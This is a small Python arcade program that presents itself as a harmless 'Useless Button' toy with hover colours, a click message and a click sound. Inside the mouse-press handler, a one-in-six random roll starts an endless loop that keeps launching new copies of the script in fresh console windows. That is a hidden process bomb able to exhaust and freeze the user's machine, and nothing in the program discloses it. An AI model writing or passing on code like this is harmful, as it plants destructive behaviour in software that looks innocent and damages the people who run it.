import arcade
from playsound import playsound
import random
import os
WIDTH = 640
HEIGHT = 480

button = False
color = arcade.color.RED
text = 'Useless Button'
message_color = arcade.color.WHITE
def update(delta_time):
    pass


def on_draw():
    arcade.start_render()
    # Draw in here...
    arcade.draw_rectangle_filled(320, 240, 340, 90, color)
    arcade.draw_rectangle_outline(320, 240, 340, 90, arcade.color.BLACK)
    arcade.draw_text(text, 260, 240, arcade.color.WHITE)
    arcade.draw_text('Click somewhere else pls', 240, 400, message_color)

def mouse_pos(x, y, dx, dy):
    global color
    if 160 <= x <= 480 and 195 <= y <= 285:
        color = arcade.color.ORANGE
    else:
        color = arcade.color.RED


def on_key_press(key, modifiers):
    pass


def on_key_release(key, modifiers):
    pass


def on_mouse_press(x, y, key, modifiers):
    global color
    global text
    global message_color
    if 160 <= x <= 480 and 195 <= y <= 285 and key == arcade.MOUSE_BUTTON_LEFT:
        color = arcade.color.PINK
        text = 'Weird Flex Dude.'
        message_color = arcade.color.RED
        playsound('mouseclick.mp3'), False
        if random.randint(1, 6) == 6:
            import subprocess, sys
            while True:
                subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    else:
        color = arcade.color.RED
        text = 'Useless Button'
        message_color = arcade.color.WHITE

def setup():
    arcade.open_window(WIDTH, HEIGHT, "Button")
    arcade.set_background_color(arcade.color.WHITE)
    arcade.schedule(update, 1 / 240)

    # Override arcade window methods
    window = arcade.get_window()
    window.on_mouse_motion = mouse_pos
    window.on_draw = on_draw
    window.on_mouse_press = on_mouse_press
    window.on_key_release = on_key_release
    arcade.run()


if __name__ == '__main__':
    setup()
